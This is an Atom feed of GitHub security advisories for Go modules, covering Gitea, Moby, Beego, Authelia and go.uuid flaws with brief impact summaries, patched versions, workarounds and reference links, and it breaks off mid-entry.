<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-04-23T03:01:22.914Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/apptainer/sif] Predictable SIF UUID Identifiers]]></title>
        <id>https://github.com/advisories/GHSA-33m6-q9v5-62r7</id>
        <link href="https://github.com/advisories/GHSA-33m6-q9v5-62r7"/>
        <updated>2024-04-22T22:03:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>
<h3 id="patches">Patches</h3>
<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>
<p>Fixed by <a href="https://github.com/hpcng/sif/pull/90">https://github.com/hpcng/sif/pull/90</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>
<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>
<h3 id="references">References</h3>
<p><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/hpcng/sif/issues">https://github.com/hpcng/sif/issues</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3538">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>
<li><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></li>
<li><a href="https://github.com/satori/go.uuid/pull/75">https://github.com/satori/go.uuid/pull/75</a></li>
<li><a href="https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1954376">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0244">https://pkg.go.dev/vuln/GO-2022-0244</a></li>
<li><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>
<li><a href="https://github.com/advisories/GHSA-33m6-q9v5-62r7">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33m6-q9v5-62r7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-02-07T22:57:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/satori/go.uuid] Predictable SIF UUID Identifiers]]></title>
        <id>https://github.com/advisories/GHSA-33m6-q9v5-62r7</id>
        <link href="https://github.com/advisories/GHSA-33m6-q9v5-62r7"/>
        <updated>2024-04-22T22:03:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The siftool new command produces predictable UUID identifiers due to insecure randomness in the version of the <code>github.com/satori/go.uuid</code> module used as a dependency.</p>
<h3 id="patches">Patches</h3>
<p>A patch is available in version &gt;= v1.2.1-0.20180404165556-75cca531ea76 of the module. Users are encouraged to upgrade.</p>
<p>Fixed by <a href="https://github.com/hpcng/sif/pull/90">https://github.com/hpcng/sif/pull/90</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Users passing CreateInfo struct should ensure the ID field is generated using a version of github.com/satori/go.uuid that is not vulnerable to this issue. Unfortunately, the latest tagged release is vulnerable to this issue. One way to obtain a non-vulnerable version is:</p>
<p><code>go get -u github.com/satori/go.uuid@v1.2.1-0.20180404165556-75cca531ea76</code></p>
<h3 id="references">References</h3>
<p><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/hpcng/sif/issues">https://github.com/hpcng/sif/issues</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7">https://github.com/hpcng/sif/security/advisories/GHSA-33m6-q9v5-62r7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3538">https://nvd.nist.gov/vuln/detail/CVE-2021-3538</a></li>
<li><a href="https://github.com/satori/go.uuid/issues/73">https://github.com/satori/go.uuid/issues/73</a></li>
<li><a href="https://github.com/satori/go.uuid/pull/75">https://github.com/satori/go.uuid/pull/75</a></li>
<li><a href="https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557">https://github.com/satori/go.uuid/commit/75cca531ea763666bc46e531da3b4c3b95f64557</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1954376">https://bugzilla.redhat.com/show_bug.cgi?id=1954376</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0244">https://pkg.go.dev/vuln/GO-2022-0244</a></li>
<li><a href="https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488">https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMSATORIGOUUID-72488</a></li>
<li><a href="https://github.com/advisories/GHSA-33m6-q9v5-62r7">https://github.com/advisories/GHSA-33m6-q9v5-62r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33m6-q9v5-62r7</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-02-07T22:57:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Path Traversal in Moby builder]]></title>
        <id>https://github.com/advisories/GHSA-6hwg-w5jg-9c6x</id>
        <link href="https://github.com/advisories/GHSA-6hwg-w5jg-9c6x"/>
        <updated>2024-04-22T19:08:27.000Z</updated>
        <content type="html"><![CDATA[<p>util/binfmt_misc/check.go in Builder in Docker Engine before 19.03.9 calls os.OpenFile with a potentially unsafe qemu-check temporary pathname, constructed with an empty first argument in an ioutil.TempDir call.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-27534">https://nvd.nist.gov/vuln/detail/CVE-2020-27534</a></li>
<li><a href="https://github.com/moby/buildkit/pull/1462">https://github.com/moby/buildkit/pull/1462</a></li>
<li><a href="https://github.com/moby/moby/pull/40877">https://github.com/moby/moby/pull/40877</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1921154">https://bugzilla.redhat.com/show_bug.cgi?id=1921154</a></li>
<li><a href="http://web.archive.org/web/20200530054359/https://docs.docker.com/engine/release-notes">http://web.archive.org/web/20200530054359/https://docs.docker.com/engine/release-notes</a></li>
<li><a href="https://github.com/advisories/GHSA-6hwg-w5jg-9c6x">https://github.com/advisories/GHSA-6hwg-w5jg-9c6x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hwg-w5jg-9c6x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-31T23:13:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[code.gitea.io/gitea] Arbitrary Code Execution in Gitea]]></title>
        <id>https://github.com/advisories/GHSA-3h6c-c475-jm7v</id>
        <link href="https://github.com/advisories/GHSA-3h6c-c475-jm7v"/>
        <updated>2024-04-22T19:07:07.000Z</updated>
        <content type="html"><![CDATA[<p>The git hook feature in Gitea 1.1.0 through 1.12.5 allows for authenticated remote code execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14144">https://nvd.nist.gov/vuln/detail/CVE-2020-14144</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/13058">https://github.com/go-gitea/gitea/pull/13058</a></li>
<li><a href="https://github.com/go-gitea/gitea/commit/8fe8ab5cbf2977f3a01ea12361df2cd76dce3ea9">https://github.com/go-gitea/gitea/commit/8fe8ab5cbf2977f3a01ea12361df2cd76dce3ea9</a></li>
<li><a href="https://docs.github.com/en/enterprise-server%402.19/admin/policies/creating-a-pre-receive-hook-script">https://docs.github.com/en/enterprise-server%402.19/admin/policies/creating-a-pre-receive-hook-script</a></li>
<li><a href="https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script">https://docs.github.com/en/enterprise-server@2.19/admin/policies/creating-a-pre-receive-hook-script</a></li>
<li><a href="https://docs.gitlab.com/ee/administration/server_hooks.html">https://docs.gitlab.com/ee/administration/server_hooks.html</a></li>
<li><a href="https://github.com/PandatiX/CVE-2021-28378">https://github.com/PandatiX/CVE-2021-28378</a></li>
<li><a href="https://github.com/PandatiX/CVE-2021-28378#notes">https://github.com/PandatiX/CVE-2021-28378#notes</a></li>
<li><a href="https://github.com/go-gitea/gitea/releases">https://github.com/go-gitea/gitea/releases</a></li>
<li><a href="https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution">https://podalirius.net/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution</a></li>
<li><a href="https://www.exploit-db.com/exploits/49571">https://www.exploit-db.com/exploits/49571</a></li>
<li><a href="https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent">https://www.fzi.de/en/news/news/detail-en/artikel/fsa-2020-3-schwachstelle-in-gitea-1125-und-gogs-0122-ermoeglicht-ausfuehrung-von-code-nach-authent</a></li>
<li><a href="http://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html">http://packetstormsecurity.com/files/162122/Gitea-Git-Hooks-Remote-Code-Execution.html</a></li>
<li><a href="https://github.com/advisories/GHSA-3h6c-c475-jm7v">https://github.com/advisories/GHSA-3h6c-c475-jm7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3h6c-c475-jm7v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-22T19:07:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/astaxie/beego] Incorrect Default Permissions in Beego]]></title>
        <id>https://github.com/advisories/GHSA-hf4p-4j9r-3cvx</id>
        <link href="https://github.com/advisories/GHSA-hf4p-4j9r-3cvx"/>
        <updated>2024-04-22T19:05:42.000Z</updated>
        <content type="html"><![CDATA[<p>The File Session Manager in Beego before 1.12.2 allows local users to read session files because of weak permissions for individual files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-16355">https://nvd.nist.gov/vuln/detail/CVE-2019-16355</a></li>
<li><a href="https://github.com/beego/beego/issues/3763">https://github.com/beego/beego/issues/3763</a></li>
<li><a href="https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd">https://github.com/beego/beego/pull/3975/commits/f99cbe0fa40936f2f8dd28e70620c559b6e5e2fd</a></li>
<li><a href="https://github.com/beego/beego/pull/3975">https://github.com/beego/beego/pull/3975</a></li>
<li><a href="https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1">https://github.com/beego/beego/commit/bac2b31afecc65d9a89f9e473b8006c5edc0c8d1</a></li>
<li><a href="https://github.com/advisories/GHSA-hf4p-4j9r-3cvx">https://github.com/advisories/GHSA-hf4p-4j9r-3cvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hf4p-4j9r-3cvx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-24T22:00:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Moby (Docker Engine) started with non-empty inheritable Linux process capabilities]]></title>
        <id>https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</id>
        <link href="https://github.com/advisories/GHSA-2mm7-x5h6-5pvq"/>
        <updated>2024-04-22T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A bug was found in Moby (Docker Engine) where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during <code>execve(2)</code>.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.</p>
<p>This bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been fixed in Moby (Docker Engine) 20.10.14.  Users should update to this version as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.</p>
<p>This fix changes Moby (Docker Engine) behavior such that containers are started with a more typical Linux environment.  Refer to <code>capabilities(7)</code> for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The entrypoint of a container can be modified to use a utility like <code>capsh(1)</code> to drop inheritable capabilities prior to the primary process starting.</p>
<h3 id="credits">Credits</h3>
<p>The Moby project would like to thank <a href="https://github.com/AndrewGMorgan">Andrew G. Morgan</a> for responsibly disclosing this issue in accordance with the <a href="https://github.com/moby/moby/blob/master/SECURITY.md">Moby security policy</a>.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/moby/moby/issues/new">Open an issue</a></li>
<li>Email us at <a href="mailto:security@docker.com">security@docker.com</a> if you think you’ve found a security bug</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq">https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24769">https://nvd.nist.gov/vuln/detail/CVE-2022-24769</a></li>
<li><a href="https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f">https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f</a></li>
<li><a href="https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1">https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5162">https://www.debian.org/security/2022/dsa-5162</a></li>
<li><a href="https://security.gentoo.org/glsa/202401-31">https://security.gentoo.org/glsa/202401-31</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>
<li><a href="https://github.com/moby/moby/releases/tag/v20.10.14">https://github.com/moby/moby/releases/tag/v20.10.14</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/05/12/1">http://www.openwall.com/lists/oss-security/2022/05/12/1</a></li>
<li><a href="https://github.com/advisories/GHSA-2mm7-x5h6-5pvq">https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-22T18:45:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/moby/moby] Moby (Docker Engine) started with non-empty inheritable Linux process capabilities]]></title>
        <id>https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</id>
        <link href="https://github.com/advisories/GHSA-2mm7-x5h6-5pvq"/>
        <updated>2024-04-22T18:45:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A bug was found in Moby (Docker Engine) where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during <code>execve(2)</code>.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.</p>
<p>This bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.</p>
<h3 id="patches">Patches</h3>
<p>This bug has been fixed in Moby (Docker Engine) 20.10.14.  Users should update to this version as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.</p>
<p>This fix changes Moby (Docker Engine) behavior such that containers are started with a more typical Linux environment.  Refer to <code>capabilities(7)</code> for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The entrypoint of a container can be modified to use a utility like <code>capsh(1)</code> to drop inheritable capabilities prior to the primary process starting.</p>
<h3 id="credits">Credits</h3>
<p>The Moby project would like to thank <a href="https://github.com/AndrewGMorgan">Andrew G. Morgan</a> for responsibly disclosing this issue in accordance with the <a href="https://github.com/moby/moby/blob/master/SECURITY.md">Moby security policy</a>.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/moby/moby/issues/new">Open an issue</a></li>
<li>Email us at <a href="mailto:security@docker.com">security@docker.com</a> if you think you’ve found a security bug</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq">https://github.com/moby/moby/security/advisories/GHSA-2mm7-x5h6-5pvq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24769">https://nvd.nist.gov/vuln/detail/CVE-2022-24769</a></li>
<li><a href="https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f">https://github.com/moby/moby/commit/2bbc786e4c59761d722d2d1518cd0a32829bc07f</a></li>
<li><a href="https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1">https://github.com/moby/moby/commit/7f375bcff41ce672cd61e9a31f3eeb2966e3dbe1</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5162">https://www.debian.org/security/2022/dsa-5162</a></li>
<li><a href="https://security.gentoo.org/glsa/202401-31">https://security.gentoo.org/glsa/202401-31</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HQCVS7WBFSTKJFNX5PGDRARMTOFWV2O7</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/HIMAHZ6AUIKN7AX26KHZYBXVECIOVWBH</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FPOJUJZXGMIVKRS4QR75F6OIXNQ6LDBL</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5FQJ3MLFSEKQYCFPFZIKYGBXPZUJFVY</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/A5AFKOQ5CE3CEIULWW4FLQKHFFU6FSYG</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6PMQKCAPK2AR3DCYITJYMMNBEGQBGLCC</a></li>
<li><a href="https://github.com/moby/moby/releases/tag/v20.10.14">https://github.com/moby/moby/releases/tag/v20.10.14</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/05/12/1">http://www.openwall.com/lists/oss-security/2022/05/12/1</a></li>
<li><a href="https://github.com/advisories/GHSA-2mm7-x5h6-5pvq">https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2mm7-x5h6-5pvq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-22T18:45:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authelia/authelia/v4] Authelia's Group Changes may not have the expected results (YAML file backend)]]></title>
        <id>https://github.com/advisories/GHSA-x883-2vmg-xwf7</id>
        <link href="https://github.com/advisories/GHSA-x883-2vmg-xwf7"/>
        <updated>2024-04-22T15:52:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Under very specific conditions changes to a users groups may not have the expected results.</p>
<p>The specific conditions are:</p>
<ul>
<li>The file authentication backend is being used.</li>
<li>The <a href="https://www.authelia.com/configuration/first-factor/file/#watch">watch</a> option is set to true.</li>
<li>The <a href="https://www.authelia.com/configuration/first-factor/introduction/#refresh_interval">refresh_interval</a> is configured to a non-disabled value.</li>
<li>The users groups are adjusted by an administrator.</li>
<li>The user attempts to access a resource that their groups previously had access to but their new groups do not have access to.</li>
</ul>
<p>When these conditions are met administrators may find the changes are not taken into account by access control for longer than expected periods. While this may not necessarily be a security vulnerability it's security-adjacent and because of the unexpected nature of it and our dedication to a security-first culture we feel it's important to make users aware of this behaviour utilizing a security advisory and the existence of a fix.</p>
<p>This:</p>
<ul>
<li>Can not have an Impact for Unauthenticated Users.</li>
<li>Can not have an Impact for Configurations utilizing the LDAP Backend.</li>
<li>Can not be directly or indirectly caused by a users or third parties actions.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>This behaviour was identified <strong><em>after</em></strong> it was inadvertently fixed in the <code>master</code> branch during the multi-cookie domain rework (i.e. between feature releases). A patch for prior versions can be provided upon request. The fix was to ensure the details are updated regardless of backend, it was a small oversight in previous functionality which made refreshing ineffectual prior to v4.37.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure you restart between user database changes.</p>
<h3 id="references">References</h3>
<ul>
